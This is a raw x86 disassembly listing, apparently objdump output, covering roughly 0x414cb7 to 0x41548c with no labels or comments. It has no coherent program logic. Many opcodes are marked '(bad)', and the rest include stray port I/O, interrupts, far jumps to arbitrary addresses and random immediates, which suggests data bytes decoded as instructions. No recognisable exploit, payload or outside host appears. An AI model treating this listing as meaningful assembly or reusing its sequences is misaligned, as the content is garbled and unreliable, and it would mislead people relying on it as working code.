  414cb7:	inc    edi
  414cb8:	inc    ebp
  414cb9:	push   ecx
  414cba:	les    esp,FWORD PTR [esi+ebx*2]
  414cbd:	shr    BYTE PTR [edi+ebp*2],0x32
  414cc1:	mov    al,0xc0
  414cc3:	mov    ds:0xc1410b49,eax
  414cc8:	data16 mov ah,0xf5
  414ccb:	out    dx,al
  414ccc:	into   
  414ccd:	outs   dx,DWORD PTR ds:[esi]
  414cce:	shr    BYTE PTR [edi-0x7d],1
  414cd1:	sar    DWORD PTR [esi-0x2d],cl
  414cd4:	add    BYTE PTR [edi],bl
  414cd6:	ret    
  414cd7:	xchg   esp,eax
  414cd8:	sub    eax,0x5eb787f2
  414cdd:	cmp    bl,BYTE PTR [eax]
  414cdf:	fcmovnb st,st(0)
  414ce1:	mov    esi,0xffb559f3
  414ce6:	ja     0x414d4d
  414ce8:	fldenv [ecx]
  414cea:	xor    DWORD PTR ds:0x2074decb,ecx
  414cf0:	jmp    0x79b97082
  414cf5:	mov    ebp,0x9f04d4dc
  414cfa:	xchg   edi,eax
  414cfb:	dec    esi
  414cfc:	pop    esi
  414cfd:	xor    ch,0xf0
  414d00:	mov    eax,0x41cae6a0
  414d05:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  414d07:	(bad)  
  414d08:	xchg   ebp,eax
  414d09:	cdq    
  414d0a:	xor    BYTE PTR [edx],0x18
  414d0d:	lds    ebp,FWORD PTR [edi]
  414d0f:	cmp    eax,0x7ecc9cd0
  414d14:	inc    edx
  414d15:	es cs pop edi
  414d18:	xor    eax,0xbc381ee3
  414d1d:	adc    edx,ebp
  414d1f:	pop    esp
  414d20:	jno    0x414d10
  414d22:	repz add BYTE PTR [edx-0x46],0x3d
  414d27:	lea    eax,[edx+eax*1-0x34]
  414d2b:	inc    esi
  414d2c:	mov    al,ds:0xce57097d
  414d31:	jbe    0x414cc2
  414d33:	mov    WORD PTR [esi+0x76],cs
  414d36:	pop    ds
  414d37:	fwait
  414d38:	adc    eax,DWORD PTR [edx+0x1abc203c]
  414d3e:	mov    edi,0x66ffebb4
  414d43:	jp     0x414d75
  414d45:	fwait
  414d46:	mov    ebp,0xa5d5579c
  414d4b:	cld    
  414d4c:	inc    ecx
  414d4d:	int    0xdf
  414d4f:	scas   eax,DWORD PTR es:[edi]
  414d50:	jl     0x414d21
  414d52:	adc    eax,0x18aacf1c
  414d57:	mov    bl,0xff
  414d59:	inc    edx
  414d5a:	push   cs
  414d5b:	or     BYTE PTR [edi+0x526e6983],dl
  414d61:	fwait
  414d62:	lahf   
  414d63:	(bad)  [edi]
  414d65:	add    DWORD PTR [eax],ebp
  414d67:	jae    0x414d2e
  414d69:	cld    
  414d6a:	das    
  414d6b:	jp     0x414d1f
  414d6d:	int3   
  414d6e:	sahf   
  414d6f:	in     eax,0x11
  414d71:	pop    es
  414d72:	clc    
  414d73:	xchg   BYTE PTR [edx],ah
  414d75:	jge    0x414d31
  414d77:	sahf   
  414d78:	into   
  414d79:	enter  0x7d26,0xa5
  414d7d:	call   0xf063:0xe8ccc83b
  414d84:	lock scas al,BYTE PTR es:[edi]
  414d86:	int    0x53
  414d88:	mov    ds:0x3ed7f8d4,al
  414d8d:	push   esi
  414d8e:	cld    
  414d8f:	ja     0x414dd8
  414d91:	mov    al,ds:0xf1b984d5
  414d96:	aaa    
  414d97:	pop    es
  414d98:	lahf   
  414d99:	xchg   esi,eax
  414d9a:	jne    0x414dee
  414d9c:	mov    ah,0x7a
  414d9e:	inc    edi
  414d9f:	add    BYTE PTR [edx-0x478cd6e8],bh
  414da5:	sub    dh,al
  414da7:	out    dx,al
  414da8:	xlat   BYTE PTR ds:[ebx]
  414da9:	dec    edx
  414daa:	mov    eax,ds:0xcf35bbb5
  414daf:	in     al,dx
  414db0:	pop    edi
  414db1:	mov    bh,0x9c
  414db3:	out    dx,eax
  414db4:	jle    0x414e2a
  414db6:	ins    BYTE PTR es:[edi],dx
  414db7:	int3   
  414db8:	pop    esi
  414db9:	xchg   ebx,eax
  414dba:	mov    ecx,0x4798489c
  414dbf:	outs   dx,DWORD PTR ds:[esi]
  414dc0:	sbb    eax,0xbe8522e
  414dc5:	pop    ss
  414dc6:	fild   DWORD PTR [edx-0x2f7595d7]
  414dcc:	adc    BYTE PTR [eax],bl
  414dce:	dec    edi
  414dcf:	inc    eax
  414dd0:	int    0x70
  414dd2:	mov    dh,0xdf
  414dd4:	cwde   
  414dd5:	push   ebp
  414dd6:	mov    ebp,0x4180a591
  414ddb:	dec    edx
  414ddc:	mov    ds:0x5a33f559,eax
  414de1:	and    al,0x90
  414de3:	xchg   ebx,eax
  414de4:	ror    DWORD PTR [edx],1
  414de6:	jnp    0x414e05
  414de8:	les    edx,FWORD PTR [ecx]
  414dea:	push   edx
  414deb:	out    dx,eax
  414dec:	loop   0x414de3
  414dee:	aad    0x99
  414df0:	dec    ecx
  414df1:	mov    bl,0xd9
  414df3:	arpl   WORD PTR [esi-0x767fc944],ax
  414df9:	jmp    0xfec6:0xd8767f1d
  414e00:	out    0xc6,al
  414e02:	add    al,0xc
  414e04:	xchg   cl,dh
  414e06:	vxorps xmm3,xmm7,XMMWORD PTR [ebx]
  414e0a:	xchg   ecx,eax
  414e0b:	push   ebx
  414e0c:	pop    eax
  414e0d:	jae    0x414d97
  414e0f:	repnz repnz into 
  414e12:	icebp  
  414e13:	cmp    DWORD PTR [esi+eiz*1+0x2973133d],ebx
  414e1a:	mov    cl,0x47
  414e1c:	mov    al,0xd4
  414e1e:	cmp    ebp,DWORD PTR [ecx-0x40427103]
  414e24:	add    dl,dh
  414e26:	sbb    edi,DWORD PTR [ecx+0x7d3b0109]
  414e2c:	push   esp
  414e2d:	ret    0x60
  414e30:	jnp    0x414e9e
  414e32:	dec    edi
  414e33:	jb     0x414e50
  414e35:	(bad)  
  414e37:	out    dx,eax
  414e38:	mov    bh,0x56
  414e3a:	outs   dx,DWORD PTR ds:[esi]
  414e3b:	out    0x81,al
  414e3d:	xor    eax,0x4633a21a
  414e42:	js     0x414e8b
  414e44:	dec    esi
  414e45:	inc    ebp
  414e46:	ds adc bl,0x6c
  414e4a:	xor    BYTE PTR [eax*1-0x65cbd639],ah
  414e51:	pusha  
  414e52:	inc    edi
  414e53:	sbb    DWORD PTR [ebx+0x38],eax
  414e56:	into   
  414e57:	cmc    
  414e58:	cld    
  414e59:	(bad)  
  414e5b:	adc    BYTE PTR [edi],ch
  414e5d:	mov    dh,0x8f
  414e5f:	pop    edx
  414e60:	mov    dl,0x54
  414e62:	cli    
  414e63:	clc    
  414e64:	add    al,0xb5
  414e66:	vcmpneq_uspd xmm3,xmm4,XMMWORD PTR [edx]
  414e6b:	pushf  
  414e6c:	sub    cl,BYTE PTR [ecx-0x49]
  414e6f:	ret    
  414e70:	out    dx,al
  414e71:	out    dx,eax
  414e72:	not    bl
  414e74:	jl     0x414ee5
  414e76:	clc    
  414e77:	adc    ah,ch
  414e79:	xchg   BYTE PTR [ebp+0x7fe609e8],ch
  414e7f:	pop    ds
  414e80:	and    BYTE PTR [esi],dh
  414e82:	inc    ebx
  414e83:	add    eax,0xfdbeeccc
  414e88:	fs enter 0xfef0,0xa0
  414e8d:	sub    DWORD PTR [ecx+edi*1-0x76aac310],esp
  414e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e95:	mov    ds:0xe590240c,eax
  414e9a:	push   eax
  414e9b:	ficomp WORD PTR [edx+esi*8]
  414e9e:	scas   al,BYTE PTR es:[edi]
  414e9f:	pop    ebx
  414ea0:	jbe    0x414e44
  414ea2:	dec    edx
  414ea3:	es js  0x414f0d
  414ea6:	outs   dx,BYTE PTR ds:[esi]
  414ea7:	(bad)  
  414ea8:	xor    esi,DWORD PTR [ebp-0x6c]
  414eab:	pop    esp
  414eac:	setne  BYTE PTR [esp+eiz*2]
  414eb0:	inc    ebp
  414eb1:	imul   esi,DWORD PTR ds:0x67b5de9e,0x85712577
  414ebb:	std    
  414ebc:	popf   
  414ebd:	fwait
  414ebe:	in     al,0x9a
  414ec0:	jae    0x414eb5
  414ec2:	push   0x16
  414ec4:	and    DWORD PTR [edi+esi*4-0x26],ebx
  414ec8:	cmp    eax,0x57898559
  414ecd:	arpl   WORD PTR [ebp+edx*4-0x4d],ax
  414ed1:	enter  0x2e04,0xc2
  414ed5:	mov    al,ds:0xea38847e
  414eda:	or     ah,bl
  414edc:	stos   BYTE PTR es:[edi],al
  414edd:	push   ecx
  414ede:	jno    0x414eab
  414ee0:	xor    al,0x4
  414ee2:	xchg   BYTE PTR [ecx],dh
  414ee4:	iret   
  414ee5:	push   ebp
  414ee6:	adc    ah,BYTE PTR [ecx-0x44267883]
  414eec:	scas   eax,DWORD PTR es:[edi]
  414eed:	or     al,0x61
  414eef:	mov    eax,ds:0x5378936b
  414ef4:	add    edi,edi
  414ef6:	fistp  QWORD PTR [eax+0x1ceb3589]
  414efc:	cmp    DWORD PTR ss:[esi-0x61bc8e01],ecx
  414f03:	jle    0x414f30
  414f05:	in     eax,dx
  414f06:	out    dx,eax
  414f07:	xor    BYTE PTR [ebp+0x2da2f9b],cl
  414f0d:	(bad)  
  414f0e:	jecxz  0x414e9e
  414f10:	jmp    0x8dc3:0x77176049
  414f17:	pop    ebx
  414f18:	xlat   BYTE PTR ds:[ebx]
  414f19:	jmp    0xaf52:0xb1974ab0
  414f20:	push   esp
  414f21:	sub    al,BYTE PTR [ebp+0x35]
  414f24:	and    eax,0xfb1a8296
  414f29:	test   BYTE PTR [eax-0x37de6947],ah
  414f2f:	adc    al,0xd9
  414f31:	(bad)
  414f34:	(bad)  
  414f35:	sahf   
  414f36:	mov    ds:0x28022d62,eax
  414f3b:	jns    0x414f16
  414f3d:	or     eax,DWORD PTR [eax+0x6e6faa74]
  414f43:	inc    ebx
  414f44:	sub    DWORD PTR [ecx*8+0x3faa2d9f],ecx
  414f4b:	aad    0x7a
  414f4d:	pop    edx
  414f4e:	por    mm0,QWORD PTR [eax+ecx*1]
  414f52:	sbb    eax,0x94db6b95
  414f57:	in     al,dx
  414f58:	and    bl,BYTE PTR [ebx+0x0]
  414f5b:	mov    ds:0xbdad4bf7,al
  414f60:	out    0x1e,al
  414f62:	xlat   BYTE PTR ds:[ebx]
  414f63:	arpl   WORD PTR [ebp+0x71],di
  414f66:	cli    
  414f67:	loopne 0x414efc
  414f69:	adc    ch,BYTE PTR [edx+esi*2+0x6e]
  414f6d:	mov    eax,0xd0165f3f
  414f72:	lds    edi,FWORD PTR [edx]
  414f74:	(bad)  
  414f75:	cmp    cl,BYTE PTR [ecx+ebx*8+0xd]
  414f79:	lods   al,BYTE PTR ds:[esi]
  414f7a:	mov    esi,0x6a11d27c
  414f7f:	fwait
  414f80:	jmp    0x414f3e
  414f82:	call   0xd0741f3a
  414f87:	(bad)  
  414f89:	rcl    BYTE PTR ds:0x496242c7,0x99
  414f90:	pop    ebx
  414f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f92:	gs xor al,0xc3
  414f95:	inc    ebx
  414f96:	out    dx,eax
  414f97:	sbb    ebp,DWORD PTR [edi]
  414f99:	sar    DWORD PTR [eax-0x594c7c87],1
  414f9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fa0:	loop   0x414f4c
  414fa2:	scas   eax,DWORD PTR es:[edi]
  414fa3:	dec    ecx
  414fa4:	mov    ds:0x6a273b69,eax
  414fa9:	test   al,0xf3
  414fab:	loope  0x41502a
  414fad:	fmul   st,st(0)
  414faf:	push   esi
  414fb0:	push   ebp
  414fb1:	cmp    ah,BYTE PTR [edx+0x42acbc79]
  414fb7:	mov    edi,DWORD PTR [ecx-0x21ffa3af]
  414fbd:	add    DWORD PTR [esp+edx*4],edi
  414fc0:	xlat   BYTE PTR es:[ebx]
  414fc2:	lds    ebp,FWORD PTR [ebx-0x1a]
  414fc5:	mov    ah,0xa3
  414fc7:	in     eax,dx
  414fc8:	and    eax,0xf8873bdf
  414fcd:	and    dl,bh
  414fcf:	shl    BYTE PTR [edx+0x73],cl
  414fd2:	aas    
  414fd3:	into   
  414fd4:	inc    eax
  414fd5:	aam    0x60
  414fd7:	mov    dh,0xc8
  414fd9:	and    edx,0x5e7cb8ec
  414fdf:	jmp    0x414ffb
  414fe1:	cs fstp st(2)
  414fe4:	mov    ah,0x4d
  414fe6:	scas   eax,DWORD PTR es:[edi]
  414fe7:	sbb    eax,0x33620874
  414fec:	inc    ebx
  414fed:	xor    edx,DWORD PTR [ebx-0x130b6dc7]
  414ff3:	(bad)  
  414ff4:	aas    
  414ff5:	gs loope 0x414f78
  414ff8:	push   ds
  414ff9:	mov    edi,0x69ad2f82
  414ffe:	mov    BYTE PTR [ecx],bh
  415000:	cmp    BYTE PTR [edi+0x47a9ba98],al
  415006:	in     eax,dx
  415007:	pop    edi
  415008:	push   ecx
  415009:	(bad)  
  41500b:	sbb    eax,0xbb94fcc8
  415010:	clc    
  415011:	popa   
  415012:	sbb    DWORD PTR [ecx],eax
  415014:	and    eax,ebx
  415016:	add    eax,0x262f606
  41501b:	inc    edx
  41501c:	pop    eax
  41501d:	xchg   ebp,eax
  41501e:	mov    ah,0xb8
  415020:	out    dx,al
  415021:	loope  0x41500c
  415023:	jns    0x415002
  415025:	(bad)  
  415026:	push   0xffffffb7
  415028:	jle    0x415094
  41502a:	sar    BYTE PTR [eax-0x2f9373f5],1
  415030:	or     edi,DWORD PTR [esi+0x43]
  415033:	es adc al,ch
  415036:	inc    esi
  415037:	mov    esp,0x6e6d97e8
  41503c:	call   0xfb553519
  415041:	inc    ebx
  415042:	inc    esi
  415043:	ja     0x4150a6
  415045:	loop   0x414ffb
  415047:	ret    
  415048:	outs   dx,BYTE PTR ds:[esi]
  415049:	and    ch,BYTE PTR [edx+0x19850b52]
  41504f:	out    0x4c,al
  415051:	xchg   ch,bh
  415053:	jae    0x415089
  415055:	loopne 0x4150cc
  415057:	iret   
  415058:	mov    al,0x20
  41505a:	dec    eax
  41505b:	sbb    ebx,ebx
  41505d:	lahf   
  41505e:	xchg   DWORD PTR [ebx],eax
  415060:	ins    DWORD PTR es:[edi],dx
  415061:	test   edx,ebp
  415063:	mov    bh,0xfc
  415065:	cwde   
  415066:	std    
  415067:	cdq    
  415068:	sub    BYTE PTR [eax],bh
  41506a:	int3   
  41506b:	mov    ds:0x6bb8771,al
  415070:	mov    edx,0x541d6fea
  415075:	js     0x415098
  415077:	sub    eax,0xcb1bb5ba
  41507c:	sbb    ebp,eax
  41507e:	jle    0x415044
  415080:	adc    esi,ebp
  415082:	push   ds
  415083:	jl     0x41506a
  415085:	sub    DWORD PTR [edx-0x1b],0x67eb2802
  41508c:	dec    ebp
  41508d:	xchg   ebx,eax
  41508e:	aaa    
  41508f:	(bad)  
  415090:	sbb    eax,ecx
  415092:	inc    edx
  415093:	xchg   ecx,eax
  415094:	pop    edx
  415095:	lock mov ebp,eax
  415098:	(bad)  
  415099:	pop    ebx
  41509a:	repz mov dh,0x2d
  41509d:	pop    ds
  41509e:	mov    esi,0x3fb0d64a
  4150a3:	call   0xccefab5d
  4150a8:	or     ebp,esi
  4150aa:	fldcw  WORD PTR [ebp-0x1bd8b15a]
  4150b0:	jnp    0x41509a
  4150b2:	and    BYTE PTR [esi],bl
  4150b4:	cwde   
  4150b5:	mov    ch,0x7d
  4150b7:	lock pop ds
  4150b9:	popa   
  4150ba:	test   BYTE PTR [edx],dh
  4150bc:	inc    ebp
  4150bd:	xchg   ebx,eax
  4150be:	dec    BYTE PTR [edx+eax*8-0x36d9b734]
  4150c5:	adc    dl,ah
  4150c7:	or     ch,BYTE PTR [edi-0x3b2b4cc2]
  4150cd:	lods   eax,DWORD PTR ds:[esi]
  4150ce:	push   edi
  4150cf:	adc    DWORD PTR [edi-0x39],edx
  4150d2:	icebp  
  4150d3:	mov    cl,0xfe
  4150d5:	adc    al,0xa0
  4150d7:	xchg   esp,eax
  4150d8:	popf   
  4150d9:	xor    ebx,DWORD PTR [ecx+0x21]
  4150dc:	nop
  4150dd:	or     eax,0x685b0830
  4150e2:	add    esi,DWORD PTR [eax+0x771c5749]
  4150e8:	in     eax,0x4a
  4150ea:	sub    DWORD PTR [ecx-0x751f073c],esi
  4150f0:	jb     0x415107
  4150f2:	pop    ecx
  4150f3:	pop    ecx
  4150f4:	and    al,0x24
  4150f6:	iret   
  4150f7:	or     al,0x44
  4150f9:	mov    ecx,DWORD PTR [edi-0x33]
  4150fc:	add    DWORD PTR [edx-0x24],ebx
  4150ff:	ja     0x415160
  415101:	popf   
  415102:	ds jmp 0x41513c
  415105:	add    al,0xa9
  415107:	inc    ebp
  415108:	mov    ah,0x3f
  41510a:	jg     0x415139
  41510c:	inc    edi
  41510d:	xchg   edi,eax
  41510e:	jo     0x41514a
  415110:	lods   al,BYTE PTR ds:[esi]
  415111:	xor    al,0x2
  415113:	sbb    ch,BYTE PTR [ebx+0x61879a4f]
  415119:	push   edx
  41511a:	bswap  ebx
  41511c:	test   eax,0xe6db6413
  415121:	jne    0x415195
  415123:	xor    BYTE PTR [esi+0x374aa9e7],dl
  415129:	mov    cl,0xac
  41512b:	mov    al,ds:0xf1a10fd9
  415130:	jmp    0x1a37:0xb45142c5
  415137:	sbb    cl,BYTE PTR [esi]
  415139:	outs   dx,BYTE PTR ds:[esi]
  41513a:	cmp    DWORD PTR [ebx-0x68406ac1],esp
  415140:	mov    eax,0x5f44abb1
  415145:	dec    ebx
  415146:	push   eax
  415147:	sbb    bh,BYTE PTR [edx+0x33]
  41514a:	dec    ecx
  41514b:	ret    
  41514c:	mov    esi,0x5f38f4ec
  415151:	cmp    DWORD PTR [ebp-0x5b],esp
  415154:	aam    0x9d
  415156:	add    eax,0xac1e0639
  41515b:	push   cs
  41515c:	ss and eax,0xd08a84c8
  415162:	push   ds
  415163:	enter  0x4527,0x17
  415167:	stos   BYTE PTR es:[edi],al
  415168:	loopne 0x415117
  41516a:	xlat   BYTE PTR ds:[ebx]
  41516b:	pop    edi
  41516c:	popf   
  41516d:	push   edi
  41516e:	scas   al,BYTE PTR es:[edi]
  41516f:	sbb    al,0x9c
  415171:	hlt    
  415172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415173:	mov    ds:0xfedc6535,eax
  415178:	mov    dh,0x1b
  41517a:	ss mov cl,0xcd
  41517d:	pushf  
  41517e:	div    BYTE PTR [esi-0x31]
  415181:	ds sahf 
  415183:	(bad)  
  415184:	sbb    ah,BYTE PTR [ebx+0x73e1ae6b]
  41518a:	stos   DWORD PTR es:[edi],eax
  41518b:	popf   
  41518c:	mov    cl,0xf1
  41518e:	stc    
  41518f:	repz repz pop edi
  415192:	or     eax,0x78fff9a2
  415197:	sub    esi,DWORD PTR [ebx]
  415199:	scas   eax,DWORD PTR es:[edi]
  41519a:	into   
  41519b:	jno    0x41513a
  41519d:	adc    bl,BYTE PTR [ebp+0x5]
  4151a0:	fnstenv [esi]
  4151a2:	arpl   WORD PTR ds:0xc03f80ed,cx
  4151a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a9:	or     eax,0x7bde700e
  4151ae:	dec    ebx
  4151af:	shl    BYTE PTR [eax+0x4771382c],1
  4151b5:	popa   
  4151b6:	mov    ?,WORD PTR [ebp+0x47]
  4151b9:	mov    dl,0x35
  4151bb:	sub    ah,BYTE PTR [ebp+0x31]
  4151be:	adc    bh,cl
  4151c0:	mov    ebp,0xdd99bda4
  4151c5:	repz jg 0x4151dc
  4151c8:	dec    eax
  4151c9:	jne    0x4151ee
  4151cb:	aam    0xaa
  4151cd:	pop    ebp
  4151ce:	inc    eax
  4151cf:	cmp    esi,DWORD PTR [esi-0x12c75fbb]
  4151d5:	mov    edi,0x2c58844a
  4151da:	(bad)  
  4151dc:	in     al,dx
  4151dd:	sbb    al,0x0
  4151df:	inc    esi
  4151e0:	push   ebx
  4151e1:	leave  
  4151e2:	cmp    BYTE PTR [esi+eiz*2+0x306d6793],0x5e
  4151ea:	repnz xor esp,esp
  4151ed:	fimul  WORD PTR [edi]
  4151ef:	lods   al,BYTE PTR ds:[esi]
  4151f0:	outs   dx,DWORD PTR ds:[esi]
  4151f1:	enter  0xcac3,0x9d
  4151f5:	div    DWORD PTR [esi+0x7d]
  4151f8:	jo     0x41519c
  4151fa:	test   eax,0x7fb596da
  4151ff:	jp     0x415259
  415201:	scas   eax,DWORD PTR es:[edi]
  415202:	dec    esp
  415203:	jmp    0xee37:0x5f30e75d
  41520a:	mov    bh,0xf9
  41520c:	jb     0x4151b1
  41520e:	out    0xc1,al
  415210:	and    eax,0x81820c39
  415215:	imul   ebx,DWORD PTR [ecx+0x814f620],0xb3cb59e4
  41521f:	xchg   al,dh
  415221:	mov    es,WORD PTR [eax]
  415223:	or     al,0xdd
  415225:	loopne 0x4151bd
  415227:	mov    es,WORD PTR [edx+ecx*1+0x4]
  41522b:	pop    edi
  41522c:	neg    DWORD PTR [edi+0x5a]
  41522f:	es dec edi
  415231:	mul    al
  415233:	mov    edi,ebx
  415235:	rcl    BYTE PTR [edi+0x4a],cl
  415238:	xor    dh,cl
  41523a:	cmp    eax,0x4cbf1d29
  41523f:	jae    0x4152a6
  415241:	daa    
  415242:	jo     0x4152bb
  415244:	(bad)  
  415245:	mov    eax,ds:0xd7962553
  41524a:	das    
  41524b:	push   edx
  41524c:	sub    BYTE PTR [ebp+0x7d],0x8b
  415250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415251:	dec    edi
  415252:	mov    al,BYTE PTR [esp+edx*1+0x3dabadac]
  415259:	add    al,0xb5
  41525b:	pop    es
  41525c:	adc    DWORD PTR [edi-0x43c325cb],ebp
  415262:	sbb    DWORD PTR [ebx],esp
  415264:	cdq    
  415265:	adc    DWORD PTR [eax+0x1e94bf89],edx
  41526b:	popa   
  41526c:	mov    dh,0xa8
  41526e:	push   esi
  41526f:	add    al,0xea
  415271:	fild   QWORD PTR [edi-0x18df034]
  415277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415278:	xor    BYTE PTR [eax-0x5e070327],bl
  41527e:	xchg   esi,eax
  41527f:	fldln2 
  415281:	call   0x80d9c
  415286:	fs ret 0xfbf9
  41528a:	add    al,0x51
  41528c:	std    
  41528d:	push   eax
  41528e:	xchg   esi,eax
  41528f:	inc    ebp
  415290:	iret   
  415291:	push   esi
  415292:	loop   0x415282
  415294:	popf   
  415295:	cmp    edx,esp
  415297:	sub    eax,0xfc98af31
  41529c:	pop    ds
  41529d:	add    BYTE PTR [edx-0x39],0xc1
  4152a1:	sbb    BYTE PTR [edi-0x63b9ae9e],al
  4152a7:	adc    DWORD PTR [eax-0x3d],edi
  4152aa:	or     eax,0x19ebc3bf
  4152af:	cwde   
  4152b0:	cmp    esp,DWORD PTR [edx+0x5be5efe7]
  4152b6:	dec    edi
  4152b7:	imul   eax,DWORD PTR [ebx+esi*2],0x5b402fe6
  4152be:	jmp    0x76eb:0xd1467332
  4152c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152c6:	sbb    al,0xf2
  4152c8:	bound  ecx,QWORD PTR [esi]
  4152ca:	lea    ebp,[ebp+edx*2-0x67]
  4152ce:	inc    esi
  4152cf:	shr    BYTE PTR ss:[edi+0x43bb0f86],1
  4152d6:	mov    WORD PTR [eax+eiz*1+0x7e],ss
  4152da:	jmp    0x4152b7
  4152dc:	push   edx
  4152dd:	inc    ebx
  4152de:	sub    eax,0x7096d648
  4152e3:	stc    
  4152e4:	xchg   ebp,eax
  4152e5:	in     eax,0xf5
  4152e7:	mov    ebx,0x14b6db11
  4152ec:	fnstenv [ecx]
  4152ee:	jp     0x415296
  4152f0:	call   0x3b2d77e3
  4152f5:	or     eax,0x598d9a67
  4152fa:	add    DWORD PTR [ebx-0x3],ebx
  4152fd:	mov    ebp,0xb082edb2
  415302:	sbb    eax,0x2ebcffb4
  415307:	ss ss (bad) 
  41530a:	loop   0x41535d
  41530c:	jl     0x41530a
  41530e:	pop    es
  41530f:	xchg   esi,eax
  415310:	sub    eax,0x192f0cb5
  415315:	(bad)  
  415316:	push   eax
  415317:	mov    esi,DWORD PTR [esp+ecx*4]
  41531a:	jmp    0x41531d
  41531c:	push   ebp
  41531d:	pop    es
  41531e:	mov    WORD PTR [ecx-0x62],ss
  415321:	dec    eax
  415322:	inc    eax
  415323:	push   ebp
  415324:	and    BYTE PTR [ebx],bh
  415326:	jnp    0x41535f
  415328:	push   es
  415329:	fwait
  41532a:	add    al,0xeb
  41532c:	sub    BYTE PTR [eax+0x1b355abf],dh
  415332:	loope  0x41537a
  415334:	scas   eax,DWORD PTR es:[edi]
  415335:	es pop eax
  415337:	in     al,0xe2
  415339:	stos   DWORD PTR es:[edi],eax
  41533a:	and    al,0x7c
  41533c:	sti    
  41533d:	cld    
  41533e:	push   ebp
  41533f:	sbb    DWORD PTR [ecx+0x24],ebx
  415342:	xor    eax,0xf343ddc9
  415347:	sbb    bh,al
  415349:	jl     0x4153a0
  41534b:	xchg   DWORD PTR [edi],esi
  41534d:	scas   al,BYTE PTR es:[edi]
  41534e:	inc    eax
  41534f:	sub    eax,0xb008b319
  415354:	push   eax
  415355:	adc    BYTE PTR [edi+ebp*1+0x64e57e07],0xe0
  41535d:	cmp    BYTE PTR [eax-0x7f6666df],ch
  415363:	or     edi,DWORD PTR [esi+0x4c004895]
  415369:	dec    esi
  41536a:	stc    
  41536b:	out    0x86,eax
  41536d:	int3   
  41536e:	sub    bl,bl
  415370:	imul   esi,DWORD PTR [eax+0x78bedbe6],0x64
  415377:	int    0x8
  415379:	sub    ah,bh
  41537b:	arpl   si,di
  41537d:	sbb    eax,0xda9e2604
  415382:	pushf  
  415383:	in     eax,0x8a
  415385:	sahf   
  415386:	add    BYTE PTR [edi],bl
  415388:	out    dx,eax
  415389:	pusha  
  41538a:	ret    
  41538b:	into   
  41538c:	ja     0x415331
  41538e:	dec    ecx
  41538f:	xchg   esi,eax
  415390:	fstp   DWORD PTR [esi+0x682660ae]
  415396:	mov    al,ds:0xdc7e9f31
  41539b:	into   
  41539c:	data16 movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41539f:	icebp  
  4153a0:	jl     0x41536c
  4153a2:	xor    eax,0x963c5749
  4153a7:	xchg   esi,eax
  4153a8:	pop    eax
  4153a9:	mov    ebx,0xe1faa5b7
  4153ae:	jl     0x41539c
  4153b0:	hlt    
  4153b1:	iret   
  4153b2:	stos   BYTE PTR es:[edi],al
  4153b3:	(bad)  
  4153b4:	call   0xaafb1946
  4153b9:	or     al,0x26
  4153bb:	pop    esi
  4153bc:	rcr    DWORD PTR [ebx+0x26ea5554],cl
  4153c2:	xchg   esi,eax
  4153c3:	xor    al,0x45
  4153c5:	sub    dl,dh
  4153c7:	mov    BYTE PTR [eax+edx*8-0x3f],cl
  4153cb:	sub    BYTE PTR [ecx],0xaa
  4153ce:	ss mov edi,0xc7c7c119
  4153d4:	dec    eax
  4153d5:	sub    al,0x78
  4153d7:	bound  esp,QWORD PTR [ecx-0x3c42bbe6]
  4153dd:	not    BYTE PTR [si+0x6f]
  4153e1:	aas    
  4153e2:	(bad)
  4153e6:	pop    edx
  4153e7:	dec    esp
  4153e8:	push   esi
  4153e9:	cld    
  4153ea:	or     ch,bh
  4153ec:	punpcklwd mm2,mm3
  4153ef:	repnz xchg edi,eax
  4153f1:	xor    DWORD PTR [edx-0x2],0x66
  4153f5:	jmp    0x4153b9
  4153f7:	adc    al,0xa8
  4153f9:	jb     0x415408
  4153fb:	loopne 0x4153a6
  4153fd:	push   edi
  4153fe:	mov    ebx,0xc15f235d
  415403:	(bad)  
  415404:	jmp    0x41541b
  415406:	(bad)
  415409:	and    DWORD PTR [ebp+0x365ebed3],ebp
  41540f:	mov    esp,esp
  415411:	(bad)  
  415412:	mov    DWORD PTR [esi+esi*2+0x25],ebp
  415416:	inc    edi
  415417:	fiadd  WORD PTR [ecx]
  415419:	out    dx,al
  41541a:	pop    esp
  41541b:	not    DWORD PTR [edx]
  41541d:	test   eax,0xb101cbbd
  415422:	popa   
  415423:	outs   dx,BYTE PTR ds:[esi]
  415424:	pop    esi
  415425:	add    eax,0xcbc22bcc
  41542a:	test   al,0xc0
  41542c:	repnz int3 
  41542e:	add    al,0x4a
  415430:	adc    BYTE PTR [ebp+eax*4-0x6],cl
  415434:	outs   dx,BYTE PTR ds:[esi]
  415435:	ret    
  415436:	adc    DWORD PTR [edx+0x14],ebx
  415439:	loope  0x415481
  41543b:	addr16 (bad) 
  41543d:	jns    0x41540e
  41543f:	jmp    0x4153f1
  415441:	and    eax,0xe1b47b55
  415446:	fdiv   st,st(3)
  415448:	pop    esi
  415449:	stc    
  41544a:	fsubr  st,st(6)
  41544c:	in     al,0x21
  41544e:	and    al,0x33
  415451:	(bad)  
  415452:	sbb    DWORD PTR [esi],ecx
  415454:	(bad)  
  415455:	pop    edx
  415456:	add    DWORD PTR [edx],edi
  415458:	or     al,0x58
  41545a:	and    DWORD PTR [ecx],ecx
  41545c:	(bad)  
  41545d:	aam    0x32
  41545f:	(bad)  [ebp+0xb]
  415462:	adc    eax,0x3203f435
  415467:	pop    es
  415468:	lods   eax,DWORD PTR ds:[esi]
  415469:	mov    edi,0x2e5d466d
  41546e:	mov    cl,0xa8
  415470:	xchg   esp,eax
  415471:	retf   0xcd24
  415474:	addr16 dec edi
  415476:	xchg   ebp,eax
  415477:	cmp    DWORD PTR [ebx],0xffffffe7
  41547a:	and    eax,0x7baafe73
  41547f:	mov    ch,0x6d
  415481:	inc    edi
  415482:	mov    ebx,0xa26b3bf
  415487:	xchg   ecx,eax
  415488:	xor    esi,ecx
  41548a:	jne    0x415448
  41548c:	fs pop edx
